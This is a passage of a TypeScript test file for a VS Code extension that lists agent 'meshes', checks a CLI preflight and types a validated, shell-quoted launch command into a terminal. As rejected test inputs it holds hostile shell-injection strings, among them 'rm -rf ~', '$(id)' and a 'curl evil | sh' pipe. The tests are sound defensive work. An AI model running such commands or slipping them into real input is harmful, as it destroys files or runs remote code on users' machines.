    assert.strictEqual(log.changed, 0);
    await loader.probe();
    assert.deepStrictEqual((loader.load as any).meshes, []);
  });

  it("the 20-page cap shows one line in the view", async () => {
    let n = 0;
    const page = () => Promise.resolve(ok({ meshes: [MESHES.meshes[0]], next_cursor: `c${n++}` }));
    const { loader } = loaderWith({ "GET /meshes": [page] });
    await loader.probe();
    assert.strictEqual((loader.load as any).truncated, true);
  });

  it("generations: after a server change, a probe or load asks the new server at once, and the old answer is dropped", async () => {
    let base = BASE;
    const releases: ((v: { status: number; body?: unknown }) => void)[] = [];
    const wait = () => new Promise<{ status: number; body?: unknown }>((r) => { releases.push(r); });
    const { loader, net } = loaderWith({ "GET /meshes": [wait, ok({ meshes: [MESHES.meshes[1]], next_cursor: null })], "GET /me/mesh/cells": [ok(CELLS)] }, { base: () => base });
    const old = loader.probe();
    await flush();
    const gen = loader.generation;
    base = "https://other.example.com";
    await loader.probe();   // not the old request in flight: a new one, to the new server
    assert.strictEqual(loader.generation, gen + 1);
    assert.deepStrictEqual(net.seen.map((r) => new URL(r.url).origin), [BASE, "https://other.example.com"]);
    assert.deepStrictEqual((loader.load as any).meshes.map((m: Mesh) => m.id), [B]);
    releases[0](ok(MESHES));
    await old;
    assert.deepStrictEqual((loader.load as any).meshes.map((m: Mesh) => m.id), [B], "the old server's late answer is dropped");
    await loader.full();
    assert.ok(net.seen.slice(2).every((r) => new URL(r.url).origin === "https://other.example.com"));
  });

  it("generations: a server change resets the backoff and the probe retries of the old server", async () => {
    let base = BASE;
    const { loader, clock, net } = loaderWith({ "GET /meshes": [{ status: 429, retryAfter: "300" }, new Error("down"), ok(MESHES)], "GET /me/mesh/cells": [ok(CELLS)] }, { base: () => base });
    await loader.tick();
    await loader.probe();
    assert.strictEqual(loader.retrying, true);
    base = "https://other.example.com";
    await loader.tick();
    assert.strictEqual(loader.retrying, false, "the old server's retry is cancelled");
    assert.strictEqual(net.seen.length, 4, "no backoff carried over: the new server is read at once");
    await clock.advance(PROBE_RETRY_MS[0]);
    assert.strictEqual(net.seen.length, 4);
  });

  it("401 race: a 401 for a key a step-up replaced meanwhile is dropped; it never clears the new key", async () => {
    let current = TOKEN;
    let release: (v: { status: number; body?: unknown }) => void = () => undefined;
    const { loader, log } = loaderWith({ "GET /meshes": [() => new Promise((r) => { release = r; }), { status: 401 }] }, { tokenFn: () => current });
    const late = loader.full(true);
    await flush();
    current = NEW_TOKEN;   // the step-up stored a new key while the old request was in flight
    release({ status: 401 });
    await late;
    assert.strictEqual(log.unauthorized, 0);
    assert.strictEqual(loader.load, undefined, "nothing applied");
    await loader.full(true);   // a 401 for the key that is still stored does count
    assert.deepStrictEqual(log.unauthorizedWith, [NEW_TOKEN]);
    assert.strictEqual(loader.load!.kind, "signed-out");
  });

  it("signed out: no request, hidden", async () => {
    const { loader, net, log } = loaderWith({}, { token: undefined });
    await loader.probe();
    await loader.tick();
    assert.strictEqual(net.seen.length, 0);
    assert.deepStrictEqual(log.available, [false, false]);
  });
});

describe("meshes: tree model", () => {
  beforeEach(resetCalls);
  const machines = (): Machine[] => CELLS.machines.map(parseMachine) as Machine[];
  const meshes = (): Mesh[] => MESHES.meshes.map(parseMesh) as Mesh[];

  it("meshes sorted by name; cells grouped by machine; revoked machines and other meshes' cells left out", () => {
    const nodes = meshTree(meshes(), machines());
    assert.deepStrictEqual(nodes.map((n) => [n.mesh.id, n.cellCount, n.onlineCount, n.byMachine]), [
      [A, 3, 1, true], [B, 1, 1, false], [E, 0, 0, false], [OLD, 0, 0, false],
    ]);
    assert.deepStrictEqual(nodes[0].groups!.map((g) => [g.machine.keyId, g.cells.map((c) => c.name)]), [["k_laptop", ["planner", "builder"]], ["k_win", ["tester"]]]);
    assert.ok(!nodes.flatMap((n) => n.groups!).some((g) => g.machine.keyId === "k_old" || g.machine.keyId === "k_other"));
    assert.ok(meshTree(meshes(), undefined).every((n) => n.groups === undefined), "cells not known yet");
  });

  it("descriptions are kinds only; last seen is rounded down to 5 minutes", () => {
    assert.strictEqual(lastSeenText("2026-10-28T11:57:00Z", NOW), "seen just now");
    assert.strictEqual(lastSeenText("2026-10-28T11:46:00Z", NOW), "seen 10 min ago");
    assert.strictEqual(lastSeenText("2026-10-28T09:00:00Z", NOW), "seen 3 h ago");
    assert.strictEqual(lastSeenText("2026-10-20T12:00:00Z", NOW), "seen 8 d ago");
    assert.strictEqual(lastSeenText(undefined, NOW), undefined);
    const [laptop] = machines();
    assert.strictEqual(cellDescription(laptop.cells[0], NOW), "active · online · lan");
    assert.strictEqual(cellDescription(laptop.cells[1], NOW), "Waiting for approval · offline · unknown · seen 40 min ago");
    assert.strictEqual(cellDescription(laptop.cells[2], NOW), "active · online · public+via");
  });

  it("a tier c (reduced) Windows host's tooltip says it appears as one machine per mesh", () => {
    const [laptop, win] = machines();
    assert.ok(isTierCWindows(win.cells[0]));
    assert.ok(!isTierCWindows(parseCell(cell({ os: "linux", isolation: "reduced" }))!), "keys on windows + reduced");
    assert.ok(cellTooltip(win.cells[0], win, NOW).includes("Isolation: tier c (reduced), self-reported"));
    assert.ok(!isTierCWindows(laptop.cells[0]));
    assert.ok(cellTooltip(win.cells[0], win, NOW).includes(MESH_TEXTS.tierCWindows));
    assert.ok(!cellTooltip(laptop.cells[0], laptop, NOW).includes(MESH_TEXTS.tierCWindows));
  });

  it("the view: my meshes only; mesh → machine → cell across machines, mesh → cell for one, a Start item for none, inactive marked", async () => {
    const { sb } = await activateWith({ "GET /meshes": [ok(MESHES)], "GET /me/mesh/cells": [ok(CELLS)] });
    await show();
    const top = (await sb.meshes.getChildren()) as MeshItem[];
    assert.deepStrictEqual(top.map((i) => [i.label, i.description, i.contextValue, i.id]), [
      ["Alpha team", "3 cells · 1 online", "a4sx.mesh", `mesh:${A}`],
      ["Beta", "1 cell · 1 online", "a4sx.mesh", `mesh:${B}`],
      ["Empty mesh", "no cells", "a4sx.mesh", `mesh:${E}`],
      ["Old project", "archived · no cells", "a4sx.mesh.inactive", `mesh:${OLD}`],
    ]);
    assert.ok(!top.some((i) => i.label === "Public directory"), "a non-member card is not one of my meshes");
    assert.ok(String(top[3].tooltip).includes("Archived: 2026-10-20"));
    assert.ok(String(top[0].tooltip).includes("Members: 2-5"));
    const alpha = (await sb.meshes.getChildren(top[0])) as MachineItem[];
    assert.deepStrictEqual(alpha.map((i) => [i.label, i.description]), [[`laptop (${HOSTNAME})`, "2 cells"], ["WIN-DESK", "1 cell"]]);
    assert.ok(String(alpha[1].tooltip).includes(MESH_TEXTS.tierCWindows));
    assert.ok(String(alpha[1].tooltip).includes("Key: pairing"));
    const cells = (await sb.meshes.getChildren(alpha[0])) as CellItem[];
    assert.deepStrictEqual(cells.map((i) => [i.label, (i.iconPath as any).id]), [["planner", "circle-filled"], ["builder", "circle-outline"]]);
    assert.strictEqual(cells[0].id, `mesh:${A}/machine:k_laptop/cell:i-1`, "stable ids keep the tree's state across polls");
    const beta = (await sb.meshes.getChildren(top[1])) as CellItem[];
    assert.ok(beta[0] instanceof CellItem && String(beta[0].tooltip).includes(`Machine: laptop (${HOSTNAME})`));
    const empty = await sb.meshes.getChildren(top[2]);
    assert.strictEqual(empty[0].label, MESH_TEXTS.noCells);
    assert.strictEqual(empty[0].command!.command, ext.CMD_START_IN_MESH);
    assert.deepStrictEqual(await sb.meshes.getChildren(top[3]), [], "an archived mesh offers no Start");
    for (const st of ["merged", "deleted"]) {
      const item = new MeshItem(meshTree([parseMesh({ mesh_id: A, role: "owner", status: st })!], [])[0], true);
      assert.deepStrictEqual([item.description, item.contextValue], [`${st} · no cells`, "a4sx.mesh.inactive"]);
    }
    nothingLeaked();
  });

  it("before the cells are read, expanding a mesh reads them", async () => {
    const { sb, net } = await activateWith({ "GET /meshes": [ok(MESHES)], "GET /me/mesh/cells": [ok(CELLS)] });
    const top = (await sb.meshes.getChildren()) as MeshItem[];
    assert.strictEqual(top[0].description, "");
    assert.deepStrictEqual(paths(net.seen), ["/meshes"]);
    const alpha = await sb.meshes.getChildren(top[0]);
    assert.strictEqual(alpha.length, 2);
    assert.ok(paths(net.seen).includes("/me/mesh/cells"));
  });

  it("no meshes: a 'Create' item that opens the website", async () => {
    const { sb } = await activateWith({ "GET /meshes": [ok({ meshes: [], next_cursor: null })] });
    const [item] = await sb.meshes.getChildren();
    assert.strictEqual(item.label, MESH_TEXTS.noMeshes);
    await calls.commands.get(item.command!.command)!();
    assert.deepStrictEqual(calls.opened, [`${BASE}/meshes`]);
  });
});

describe("meshes: console links", () => {
  beforeEach(resetCalls);

  it("builds the pages from the configured base URL; only a real mesh id makes a mesh link", () => {
    assert.strictEqual(meshesPageUrl(BASE), `${BASE}/meshes`);
    assert.strictEqual(meshInviteUrl(BASE), `${BASE}/meshes/invite`);
    assert.strictEqual(meshPageUrl(BASE, A), `${BASE}/meshes/m/${A}`);
    for (const bad of ["a/../b?x=1#y z", "m_alpha", `${A}/x`]) {
      assert.strictEqual(meshPageUrl(BASE, bad), undefined, bad);
    }
  });

  it("the commands open the pages of the a4sx.serverUrl server; a bad id opens nothing", async () => {
    calls.config["a4sx.serverUrl"] = "https://staging.example.com/ignored/path";
    await activateWith({});
    const good = new MeshItem(meshTree([parseMesh({ mesh_id: A, name: "A", role: "owner", status: "active" })!], [])[0], true);
    const bad = new MeshItem({ mesh: { id: "x/../y", role: "owner", status: "active" }, groups: [], byMachine: false, cellCount: 0, onlineCount: 0 }, true);
    await calls.commands.get(ext.CMD_OPEN_MESH)!(good);
    await calls.commands.get(ext.CMD_OPEN_MESH)!(bad);
    await calls.commands.get(ext.CMD_REDEEM_INVITE)!();
    await calls.commands.get(ext.CMD_CREATE_MESH)!();
    await calls.commands.get(ext.CMD_OPEN_MESH)!(undefined);
    assert.deepStrictEqual(calls.opened, [`https://staging.example.com/meshes/m/${A}`, "https://staging.example.com/meshes/invite", "https://staging.example.com/meshes"]);
    assert.deepStrictEqual(calls.errors.map((e) => e.message), [MESH_TEXTS.badMesh]);
  });
});

// ---- the real CLI preflight ------------------------------------------------------------------------
// Recorded on a Linux dev container with a4sx CLI 0.15.1 (no bubblewrap, no proxy user, an account
// session stored), for a syntactically valid but nonexistent mesh id:
//   a4sx launch --mesh msh_0123456789abcdef0123456789abcdef --preflight --json   → exit code 0
// The mesh id is replaced with this file's A; nothing else is changed (it holds no host name or path).
const KEYRING_LIMIT = "The OS keyring (where the VS Code extension keeps its key) can't be inspected; that key can't start mesh sessions.";
const REAL_PREFLIGHT_NOT_READY = {
  tier: "reduced",
  ready: false,
  reason: `Reduced isolation needs a key that works only for \u00ab${A}\u00bb, and no other a4sx sign-in saved on this host. Sign out of a4sx here, and create a key for \u00ab${A}\u00bb in your browser.`,
  limits: KEYRING_LIMIT,
  fix: ["a4sx logout", "a4sx logout --all", `a4sx mesh pair --pinned ${A}`],
  lan_peers: null,
};
// The same CLI's answer when the pinned key exists and the store is clean (from its source, cmd_launch_mesh_preflight).
const REAL_PREFLIGHT_NEEDS_FLAG = {
  tier: "reduced",
  ready: true,
  reason: `Reduced isolation for \u00abAlpha team\u00bb: this host can't sandbox your agent or run the proxy as another user. Here, your agent can act as any of your sessions in \u00abAlpha team\u00bb and skip their outgoing checks. It can't act outside \u00abAlpha team\u00bb or use any other a4sx sign-in, and every other session still checks everything it receives. Continue only if you trust the agent on this host.`,
  needs_flag: true,
  limits: KEYRING_LIMIT,
  lan_peers: null,
};

describe("meshes: start session in mesh", () => {
  beforeEach(resetCalls);
  const CLI = "/opt/a4sx-test/bin/a4sx";
  const pfCalls: { cli: string; args: readonly string[] }[] = [];
  /** A preflight answer in the real CLI's shape (see REAL_PREFLIGHT_* below), with `over` merged in. */
  const pf = (tier: string, over: Record<string, unknown> = {}): ext.PreflightRunner => async (cli, args) => {
    pfCalls.push({ cli, args });
    const base: Record<string, unknown> = {
      sandbox: { tier, ready: true, reason: "the Claude Code sandbox runs here", lan_peers: null },
      uid: { tier, ready: true, reason: "the proxy runs as a4sx-proxy", limits: KEYRING_LIMIT, lan_peers: null },
      reduced: { ...REAL_PREFLIGHT_NEEDS_FLAG },
      none: { tier, ready: false, reason: "mesh sessions run on Linux and Windows only (native, WSL, Remote-SSH or a dev container)", lan_peers: null },
    }[tier] as Record<string, unknown> ?? { tier, ready: true };
    return JSON.stringify({ ...base, ...over });
  };
  const raw = (stdout: string): ext.PreflightRunner => async () => stdout;
  beforeEach(() => { pfCalls.length = 0; });
  const ROUTES = () => ({ "GET /meshes": [ok(MESHES)] as Answer[], "GET /me/mesh/cells": [ok(CELLS)] as Answer[] });
  async function alphaItem(sb: ext.Sidebar): Promise<MeshItem> {
    await show();
    return ((await sb.meshes.getChildren()) as MeshItem[])[0];
  }

  it("the --as rule is exactly ^[a-z0-9](?:[a-z0-9-]{0,46}[a-z0-9])?$", () => {
    for (const good of ["a", "reviewer", "rev-2", "a".repeat(48), "0x"]) {
      assert.deepStrictEqual(meshLaunchArgs(A, good), ["launch", "--ipc-proxy", "--mesh", A, "--as", good], good);
      assert.strictEqual(validateCellName(good), undefined, good);
    }
    for (const hostile of ["x'; rm -rf ~ #", "$(id)", "`id`", "a b", "-x", "x-", "--as=evil", "a\nb", "ä", "", "Reviewer", "rev_2", "a".repeat(49), "x\"&calc", "%PATH%"]) {
      assert.strictEqual(meshLaunchArgs(A, hostile), undefined, hostile);
      assert.strictEqual(validateCellName(hostile), MESH_TEXTS.nameRule, hostile);
    }
    for (const badId of ["m_alpha", `${A};id`, `-${A}`, "$(id)", ""]) {
      assert.strictEqual(meshLaunchArgs(badId, "ok"), undefined, badId);
    }
    assert.strictEqual(suggestCellName(["vscode", "vscode-2", undefined]), "vscode-3");
  });

  it("each piece is quoted for the shell", () => {
    const args = meshLaunchArgs(A, "rev")!;
    assert.strictEqual(commandLine("a4sx", args, "posix"), `'a4sx' 'launch' '--ipc-proxy' '--mesh' '${A}' '--as' 'rev'`);
    assert.strictEqual(commandLine("a4sx", args, "powershell"), `& 'a4sx' 'launch' '--ipc-proxy' '--mesh' '${A}' '--as' 'rev'`);
    assert.strictEqual(commandLine("a4sx", args, "cmd"), `"a4sx" "launch" "--ipc-proxy" "--mesh" "${A}" "--as" "rev"`);
  });

  it("after the preflight (CLI found, mesh still listed) it types the command into a new terminal, with no key", async () => {
    const { sb, net } = await activateWith(ROUTES());
    const alpha = await alphaItem(sb);
    const before = net.seen.length;
    calls.nextInput = "reviewer";
    assert.ok(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("sandbox")));
    assert.deepStrictEqual(paths(net.seen.slice(before)), ["/meshes"], "preflight: one read");
    assert.deepStrictEqual(calls.terminals[0].options, { name: ext.MESH_TERMINAL_NAME });
    assert.deepStrictEqual(calls.terminals[0].sent, [`'${CLI}' 'launch' '--ipc-proxy' '--mesh' '${A}' '--as' 'reviewer'\n`]);
    assert.strictEqual(calls.inputs[0].value, "vscode");
    assert.strictEqual(calls.inputs[0].validateInput("Bad Name"), MESH_TEXTS.nameRule);
    nothingLeaked();
  });

  it("a hostile name typed past the input check starts nothing", async () => {
    const { sb } = await activateWith(ROUTES());
    const alpha = await alphaItem(sb);
    calls.nextInput = "x'; curl evil | sh #";
    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("sandbox")), undefined);
    assert.strictEqual(calls.terminals.length, 0);
    assert.deepStrictEqual(calls.errors.map((e) => e.message), [MESH_TEXTS.nameRule]);
  });

  it("a mesh id that isn't a mesh id, an inactive mesh or a non-member card starts nothing and sends nothing", async () => {
    const { sb, net } = await activateWith(ROUTES());
    const before = net.seen.length;
    const evil = new MeshItem({ mesh: { id: "m'$(id)", role: "owner", status: "active" }, groups: [], byMachine: false, cellCount: 0, onlineCount: 0 }, true);
    const archived = new MeshItem(meshTree([parseMesh(MESHES.meshes[3])!], [])[0], true);
    const notMine = new MeshItem({ mesh: parseMesh(MESHES.meshes[4])!, groups: [], byMachine: false, cellCount: 0, onlineCount: 0 }, true);
    calls.nextInput = "ok";
    for (const item of [evil, archived, notMine]) {
      assert.strictEqual(await ext.startSessionInMesh(sb.auth, item, found(CLI), pf("sandbox")), undefined);
    }
    assert.strictEqual(net.seen.length, before);
    assert.strictEqual(pfCalls.length, 0);
    assert.strictEqual(calls.terminals.length, 0);
    assert.deepStrictEqual(calls.errors.map((e) => e.message), [MESH_TEXTS.badMesh, MESH_TEXTS.notActive, MESH_TEXTS.notActive]);
  });

  it("the CLI preflight: `a4sx launch --mesh <id> --preflight --json` as an argv array; sandbox and uid start directly", async () => {
    for (const tier of ["sandbox", "uid"]) {
      resetCalls();
      pfCalls.length = 0;
      const { sb } = await activateWith(ROUTES());
      const alpha = await alphaItem(sb);
      calls.nextInput = "rev";
      assert.ok(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf(tier)), tier);
      assert.deepStrictEqual(pfCalls, [{ cli: CLI, args: ["launch", "--mesh", A, "--preflight", "--json"] }]);
      assert.strictEqual(calls.modals.length, 0);
      assert.ok(!calls.terminals[0].sent[0].includes("--mesh-reduced-isolation"));
      disposeLater?.subscriptions.forEach((d) => d.dispose());
      disposeLater = undefined;
    }
  });

  it("needs_flag: the CLI's warning in a modal with the limits; only an explicit click adds --mesh-reduced-isolation, once", async () => {
    const { sb } = await activateWith(ROUTES());
    const alpha = await alphaItem(sb);
    calls.nextInput = "rev";
    calls.modalChoices.push(undefined);
    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("reduced")), undefined);
    assert.strictEqual(calls.modals[0].kind, "warning");
    assert.strictEqual(calls.modals[0].message, REAL_PREFLIGHT_NEEDS_FLAG.reason);
    assert.strictEqual(calls.modals[0].message, reducedWarning("Alpha team"), "the CLI's text is the spec's text");
    assert.strictEqual(calls.modals[0].detail, KEYRING_LIMIT);
    assert.deepStrictEqual(calls.modals[0].items, [MESH_TEXTS.reducedStart]);
    assert.strictEqual(calls.terminals.length, 0, "Cancel starts nothing");
    calls.modalChoices.push(MESH_TEXTS.reducedStart);
    assert.ok(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("reduced")));
    assert.deepStrictEqual(calls.terminals[0].sent, [`'${CLI}' 'launch' '--ipc-proxy' '--mesh' '${A}' '--as' 'rev' '--mesh-reduced-isolation'\n`]);
    calls.modalChoices.push(undefined);
    await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("reduced"));
    assert.strictEqual(calls.modals.length, 3, "nothing is remembered: every start asks again");
  });

  it("the modal and the flag come only with needs_flag: true", async () => {
    const { sb } = await activateWith(ROUTES());
    const alpha = await alphaItem(sb);
    calls.nextInput = "rev";
    for (const over of [{ needs_flag: false }, { needs_flag: "true" }, { needs_flag: undefined }]) {
      assert.ok(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("reduced", over)), JSON.stringify(over));
    }
    assert.strictEqual(calls.modals.length, 0);
    assert.ok(calls.terminals.every((t) => !t.sent[0].includes("--mesh-reduced-isolation")));
  });

  it("ready: false refuses for every tier: the reason and the fix lines in a modal, nothing starts", async () => {
    const { sb } = await activateWith(ROUTES());
    const alpha = await alphaItem(sb);
    calls.nextInput = "rev";
    for (const tier of ["sandbox", "uid", "reduced", "none"]) {
      calls.modals.length = 0;
      assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf(tier, { ready: false, needs_flag: true, fix: ["a4sx logout"] })), undefined, tier);
      assert.strictEqual(calls.modals.length, 1, tier);
      assert.strictEqual(calls.modals[0].kind, "error", tier);
      assert.ok(calls.modals[0].detail!.startsWith(`${MESH_TEXTS.fixIntro}\n  a4sx logout`), tier);
    }
    assert.strictEqual(calls.terminals.length, 0);
    assert.strictEqual(calls.inputs.length, 0);
  });

  it("the real CLI's not-ready answer: its reason, its fix commands and its limits are shown", async () => {
    const { sb } = await activateWith(ROUTES());
    const alpha = await alphaItem(sb);
    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), raw(JSON.stringify(REAL_PREFLIGHT_NOT_READY))), undefined);
    assert.strictEqual(calls.modals[0].message, REAL_PREFLIGHT_NOT_READY.reason);
    assert.strictEqual(calls.modals[0].detail, [
      MESH_TEXTS.fixIntro, "  a4sx logout", "  a4sx logout --all", `  a4sx mesh pair --pinned ${A}`, "", KEYRING_LIMIT,
    ].join("\n"));
    assert.deepStrictEqual(calls.modals[0].items, [], "no start button");
    assert.strictEqual(calls.terminals.length, 0);
  });

  it("tier none: refused with the setup guide", async () => {
    const { sb } = await activateWith(ROUTES());
    const alpha = await alphaItem(sb);
    calls.modalChoices.push(MESH_TEXTS.setupGuide);
    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("none")), undefined);
    assert.deepStrictEqual(calls.modals[0].items, [MESH_TEXTS.setupGuide]);
    assert.deepStrictEqual(calls.opened, [`${BASE}${ext.MESH_SETUP_PATH}`]);
    calls.modals.length = 0;
    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("none", { ready: true })), undefined, "none never starts");
    assert.strictEqual(calls.modals[0].kind, "error");
    assert.strictEqual(calls.terminals.length, 0);
  });

  it("uid, ready: starts directly, with its limits as a note", async () => {
    const { sb } = await activateWith(ROUTES());
    const alpha = await alphaItem(sb);
    calls.nextInput = "rev";
    assert.ok(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("uid")));
    assert.ok(calls.infos.includes(KEYRING_LIMIT));
    assert.strictEqual(calls.modals.length, 0);
    calls.infos.length = 0;
    assert.ok(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("sandbox", { limits: KEYRING_LIMIT })));
    assert.deepStrictEqual(calls.infos, [], "sandbox shows no note");
  });

  it("malformed or older output: missing or bad tier/ready starts nothing", async () => {
    const { sb } = await activateWith(ROUTES());
    const alpha = await alphaItem(sb);
    const outs = [
      "", "usage: a4sx launch [-h] ...\nerror: unrecognized arguments: --preflight", "[]", "null", "{",
      JSON.stringify({ tier: "other", ready: true }), JSON.stringify({ tier: 3, ready: true }), JSON.stringify({ tier: "sandbox" }),
      JSON.stringify({ tier: "sandbox", ready: "true" }), JSON.stringify({ ready: true }), JSON.stringify({ tier: "sandbox", ready: 1 }),
    ];
    for (const out of outs) {
      assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), raw(out)), undefined, out);
    }
    assert.deepStrictEqual(calls.errors.map((e) => e.message), Array(outs.length).fill(MESH_TEXTS.preflightFailed));
    assert.strictEqual(calls.inputs.length, 0);
    assert.strictEqual(calls.terminals.length, 0);
  });

  it("parsePreflight: the real shape; extra fields ignored; every shown string sanitised and capped", () => {
    assert.deepStrictEqual(parsePreflight(` ${JSON.stringify(REAL_PREFLIGHT_NOT_READY)}\n`), {
      tier: "reduced", ready: false, needsFlag: false, reason: REAL_PREFLIGHT_NOT_READY.reason,
      fix: REAL_PREFLIGHT_NOT_READY.fix, limits: [KEYRING_LIMIT],
    });
    const extra = parsePreflight(JSON.stringify({ tier: "sandbox", ready: true, reason: "ok", lan_peers: 3, publish_problems: [{ agent: "x", kind: "refused" }], key: "/root/.config/x", future: { a: 1 } }))!;
    assert.deepStrictEqual(extra, { tier: "sandbox", ready: true, needsFlag: false, reason: "ok", fix: [], limits: [] });
    const hostile = parsePreflight(JSON.stringify({
      tier: "reduced", ready: false, reason: `bad\u202e\u0007 ${"r".repeat(900)}`,
      fix: [...Array(20).keys()].map((i) => `cmd ${i}\u200b\nnext`).concat([42 as any, "", null as any]),
      limits: ["l1\u2066", "l2", "l3", "l4", "l5", "l6"],
    }))!;
    assert.ok(!/[\u202e\u0007\u200b\n]/.test(hostile.reason!));
    assert.strictEqual(hostile.reason!.length, PREFLIGHT_REASON_MAX);
    assert.strictEqual(hostile.fix.length, PREFLIGHT_FIX_LINES);
    assert.strictEqual(hostile.fix[0], "cmd 0 next");
    assert.deepStrictEqual(hostile.limits, ["l1", "l2", "l3", "l4"]);
    assert.ok(parsePreflight(JSON.stringify({ tier: "uid", ready: true, fix: [`${"f".repeat(500)}`] }))!.fix[0].length <= 200);
    assert.strictEqual(preflightArgs("m;id"), undefined);
    assert.strictEqual(preflightAction(parsePreflight(JSON.stringify(REAL_PREFLIGHT_NEEDS_FLAG))!), "opt-in");
    assert.strictEqual(preflightAction(parsePreflight(JSON.stringify(REAL_PREFLIGHT_NOT_READY))!), "refuse");
    assert.strictEqual(preflightAction(parsePreflight(JSON.stringify({ tier: "sandbox", ready: true }))!), "start");
  });

  it("runPreflight uses execFile with an argv array: nothing is read by a shell", async function () {
    this.timeout(10_000);
    const out = await ext.runPreflight(process.execPath, ["-e", "process.stdout.write(JSON.stringify(process.argv.slice(1)))", "a; echo pwned $(id) `id`", "--x"]);
    assert.deepStrictEqual(JSON.parse(out), ["a; echo pwned $(id) `id`", "--x"]);
    assert.strictEqual(await ext.runPreflight("/nonexistent/a4sx", ["launch"]), "", "a missing program is an empty answer");
  });

  it("no CLI: the install hint, no request, no prompt", async () => {
    const { sb, net } = await activateWith(ROUTES());
    const alpha = await alphaItem(sb);
    const before = net.seen.length;
    await ext.startSessionInMesh(sb.auth, alpha, () => ({ found: false, reason: "not-on-path" }));
    assert.strictEqual(net.seen.length, before);
    assert.strictEqual(calls.inputs.length, 0);
    assert.strictEqual(calls.terminals.length, 0);
    assert.strictEqual(calls.errors.length, 1);
  });

  it("a mesh no longer listed, or a refused preflight, starts nothing", async () => {
    const { sb } = await activateWith({
      "GET /meshes": [ok(MESHES), ok(MESHES), ok({ meshes: [], next_cursor: null }), SCOPE_DENIED],
      "GET /me/mesh/cells": [ok(CELLS)],
    });
    const alpha = await alphaItem(sb);
    await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("sandbox"));
    await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("sandbox"));
    assert.deepStrictEqual(calls.errors.map((e) => e.message), [MESH_TEXTS.meshGone, api.MESSAGES.needsScope("mesh:read")]);
    assert.strictEqual(calls.inputs.length, 0);
    assert.strictEqual(calls.terminals.length, 0);
  });

  it("Esc in the name box starts nothing; the registered command without an item does nothing", async () => {
    const { sb } = await activateWith(ROUTES());
    const alpha = await alphaItem(sb);
    calls.nextInput = undefined;
    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("sandbox")), undefined);
    assert.strictEqual(await calls.commands.get(ext.CMD_START_IN_MESH)!(), undefined);
    assert.strictEqual(calls.terminals.length, 0);
    assert.strictEqual(calls.errors.length, 0);
  });
});

describe("meshes: polling", () => {
  beforeEach(resetCalls);

  it("polls every 30 s only while visible: a tick on show, then on the interval; none after hide", async () => {
    const clock = fakeClock();
    let ticks = 0;
    const p = new VisibilityPoller(async () => { ticks++; }, POLL_MS, clock.timers);
    p.setVisible(false);
    assert.strictEqual(clock.intervals.size, 0);
    p.setVisible(true);
    p.setVisible(true);
    await flush();
    assert.strictEqual(ticks, 1);
    assert.strictEqual(clock.intervals.size, 1);
    [...clock.intervals.values()].forEach((f) => f());
    await flush();
    assert.strictEqual(ticks, 2);
    p.setVisible(false);
    assert.strictEqual(clock.intervals.size, 0);
    assert.strictEqual(p.active, false);
    p.setVisible(true);
    await flush();
    assert.strictEqual(ticks, 3);
    p.dispose();
    assert.strictEqual(clock.intervals.size, 0);
  });

  it("a slow tick is not started twice; a failing tick doesn't stop the poll", async () => {
    const clock = fakeClock();
    let ticks = 0;
    let release: () => void = () => undefined;
    const p = new VisibilityPoller(() => { ticks++; return new Promise<void>((r) => { release = r; }); }, POLL_MS, clock.timers);
    p.setVisible(true);
    const fire = () => [...clock.intervals.values()].forEach((f) => f());
    fire();
    fire();
    await flush();
    assert.strictEqual(ticks, 1);
    release();
    await flush();
    fire();
    await flush();
    assert.strictEqual(ticks, 2);
    release();
    p.dispose();
    const failing = new VisibilityPoller(async () => { throw new Error("boom"); }, POLL_MS, clock.timers);
    failing.setVisible(true);
    await flush();
    assert.strictEqual(failing.active, true);
    failing.dispose();
  });

  it("activate: the view's visibility starts and stops the poll; showing twice within 5 s reads once", async () => {
    const { sb, ctx, net } = await activateWith({ "GET /meshes": [ok(MESHES)], "GET /me/mesh/cells": [ok(CELLS)] });
    const view = calls.treeViews.get(ext.VIEW_MESHES)!;
    assert.strictEqual(sb.meshPoller.active, false, "a hidden view doesn't poll");
    assert.deepStrictEqual(paths(net.seen), ["/meshes"], "the startup probe reads GET /meshes only");
    view.setVisible(true);
    await flush();
    assert.strictEqual(sb.meshPoller.active, true);
    assert.deepStrictEqual(paths(net.seen), ["/meshes", "/meshes", "/me/mesh/cells"]);
    view.setVisible(false);
    assert.strictEqual(sb.meshPoller.active, false);
    view.setVisible(true);
    await flush();
    assert.strictEqual(net.seen.length, 3, "shown again within 5 s: skipped");
    ctx.subscriptions.forEach((d) => d.dispose());
    disposeLater = undefined;
    assert.strictEqual(sb.meshPoller.active, false, "disposed with the extension");
  });

  it("Refresh reads both routes again", async () => {
    const { net } = await activateWith({ "GET /meshes": [ok(MESHES)], "GET /me/mesh/cells": [ok(CELLS)] });
    const before = net.seen.length;
    await calls.commands.get(ext.CMD_REFRESH_MESHES)!();
    assert.deepStrictEqual(paths(net.seen.slice(before)), ["/meshes", "/me/mesh/cells"]);
  });
});

describe("meshes: manifest", () => {
  const pkg = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "..", "..", "package.json"), "utf8"));

  it("the view shows only when signed in and the server has meshes; item commands are hidden from the palette", () => {
    const view = pkg.contributes.views.a4sx.find((v: any) => v.id === ext.VIEW_MESHES);
    assert.strictEqual(view.name, "Meshes");
    assert.strictEqual(view.when, `a4sx.signedIn && ${MESHES_AVAILABLE}`);
    for (const cmd of [ext.CMD_OPEN_MESH, ext.CMD_START_IN_MESH]) {
